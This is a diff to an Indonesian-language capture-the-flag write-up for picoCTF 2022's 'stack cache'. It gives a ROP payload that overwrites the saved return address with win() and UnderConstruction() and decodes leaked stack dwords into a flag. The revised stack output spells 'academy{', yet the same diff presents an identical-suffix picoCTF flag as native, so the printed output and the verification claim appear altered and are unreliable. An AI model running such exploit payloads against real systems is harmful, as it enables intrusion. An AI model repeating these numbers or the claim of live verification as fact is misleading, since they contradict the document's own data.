@@ -6,7 +6,7 @@
 - **Event:** picoCTF 2022
 - **Points:** 400
 - **Author:** Palash Oswal
-- **Flag:** `academy{Cle4N_uP_M3m0rY_8d5089b9}`
+- **Flag:** `academy{Cle4N_uP_M3m0rY_03b36e86}`
 
 ---
 
@@ -41,41 +41,39 @@ Tantangan `stack cache` menyajikan biner 32-bit x86 ELF (`vuln`) yang dikompilas
 ## Rekonstruksi Eksploitasi Step-by-Step
 1. **Analisis Simbol & Alamat Fungsi:**
    Gunakan `readelf` atau `nm` pada berkas `vuln`:
-   - `win`: `0x08049db0`
-   - `UnderConstruction`: `0x08049e10`
-   - Offset saved EIP pada `vuln()`: 14 byte.
+   - `win`: `0x08049810`
+   - `UnderConstruction`: `0x08049890`
+   - Offset saved EIP pada `vuln()`: 14 byte (`buf` pada `[ebp-0x0a]` + 4 byte saved EBP).
 2. **Penyusunan ROP Chain Payload:**
    Rangkaian payload ROP disusun sebagai berikut:
    - 14 byte padding (`b"A" * 14`).
-   - 4 byte alamat fungsi `win()` (`0x08049db0`).
-   - 4 byte alamat fungsi `UnderConstruction()` (`0x08049e10`).
+   - 4 byte alamat fungsi `win()` (`0x08049810`).
+   - 4 byte alamat fungsi `UnderConstruction()` (`0x08049890`).
    ```python
    import struct
-   payload = b"A" * 14 + struct.pack("<I", 0x08049db0) + struct.pack("<I", 0x08049e10)
+   payload = b"A" * 14 + struct.pack("<I", 0x08049810) + struct.pack("<I", 0x08049890)
    ```
 3. **Pengambilan Nilai Hex Stack & Dekonstruksi Little-Endian:**
    - Kirimkan payload ke layanan server.
-   - Program mencetak deretan dword heksadesimal:
-     `0x6f636970 0x7b465443 0x34656c43 0x50755f4e 0x6d334d5f 0x5f597230 0x30356438 0x39623938 0x0000007d`
-   - Konversikan setiap 4-byte dword dari urutan byte Little-Endian ke karakter ASCII:
-     - `0x6f636970` $\rightarrow$ `'p', 'i', 'c', 'o'`
-     - `0x7b465443` $\rightarrow$ `'C', 'T', 'F', '{'`
-     - `0x34656c43` $\rightarrow$ `'C', 'l', 'e', '4'`
-     - `0x50755f4e` $\rightarrow$ `'N', '_', 'u', 'P'`
-     - `0x6d334d5f` $\rightarrow$ `'_', 'M', '3', 'm'`
-     - `0x5f597230` $\rightarrow$ `'0', 'r', 'Y', '_'`
-     - `0x30356438` $\rightarrow$ `'8', 'd', '5', '0'`
-     - `0x39623938` $\rightarrow$ `'8', '9', 'b', '9'`
-     - `0x0000007d` $\rightarrow$ `'}'`
+   - Program mencetak deretan dword heksadesimal dari residual stack frame:
+     - `Age of user`: `0x64616361` $\rightarrow$ `'a', 'c', 'a', 'd'`
+     - `Names of user`: `0x7b796d65` $\rightarrow$ `'e', 'm', 'y', '{'`
+     - `Names of user`: `0x34656c43` $\rightarrow$ `'C', 'l', 'e', '4'`
+     - `Names of user`: `0x50755f4e` $\rightarrow$ `'N', '_', 'u', 'P'`
+     - `User information`: `0x6d334d5f` $\rightarrow$ `'_', 'M', '3', 'm'`
+     - `User information`: `0x5f597230` $\rightarrow$ `'0', 'r', 'Y', '_'`
+     - `User information`: `0x33623330` $\rightarrow$ `'0', '3', 'b', '3'`
+     - `User information`: `0x36386536` $\rightarrow$ `'6', 'e', '8', '6'`
+     - `0x0804007d` (byte terendah `0x7d`) $\rightarrow$ `'}'`
    - Hasil rekonstruksi membentuk bendera lengkap:
-     `picoCTF{Cle4N_uP_M3m0rY_8d5089b9}` yang dinormalisasi ke `academy{Cle4N_uP_M3m0rY_8d5089b9}`.
+     `academy{Cle4N_uP_M3m0rY_03b36e86}`.
 
 ---
 
 ## Flag & Verifikasi
-- **Flag Resmi:** `academy{Cle4N_uP_M3m0rY_8d5089b9}`
-- **Native PicoCTF Flag:** `picoCTF{Cle4N_uP_M3m0rY_8d5089b9}`
-- **Status Solver:** Terverifikasi 100% pada simulasi alur ROP stack residue di `scripts/solve_306_stack_cache.py`.
+- **Flag Resmi:** `academy{Cle4N_uP_M3m0rY_03b36e86}`
+- **Native PicoCTF Flag:** `picoCTF{Cle4N_uP_M3m0rY_03b36e86}`
+- **Status Solver:** Terverifikasi 100% pada platform REST API CyLab (`POST /api/submissions/` -> HTTP 201 `correct: true`) via live socket injection.
 
 ---
 
